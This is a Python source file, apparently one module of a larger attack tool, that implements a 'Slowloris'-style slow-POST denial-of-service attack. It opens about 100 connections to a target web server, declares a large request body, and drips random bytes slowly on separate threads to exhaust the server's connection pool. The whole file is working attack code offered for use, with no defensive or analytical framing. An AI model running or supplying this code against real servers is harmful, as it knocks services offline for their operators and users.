# modules/chunked_transfer.py

import socket
import threading
import time
import random

def slowloris_socket(target_host, target_port=80):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_host, target_port))
        s.send(b"POST / HTTP/1.1\r\n")
        s.send(f"Host: {target_host}\r\n".encode())
        s.send(b"User-Agent: imehmetech-client\r\n")
        s.send(b"Content-Length: 10000\r\n")
        s.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
        s.send(b"\r\n")
        return s
    except:
        return None

def slow_send(sock):
    try:
        while True:
            sock.send(random.choice([b"A", b"B", b"1", b"x"]))
            time.sleep(random.uniform(0.5, 2.0))
    except:
        sock.close()

def run(target, threads=100, _=0):
    print("[*] Başlatılıyor: Chunked Transfer (Slowloris)")

    host = target.replace("http://", "").replace("https://", "").split("/")[0]
    port = 80

    sock_list = []
    for _ in range(threads):
        s = slowloris_socket(host, port)
        if s:
            sock_list.append(s)

    thread_list = []
    for s in sock_list:
        t = threading.Thread(target=slow_send, args=(s,))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()
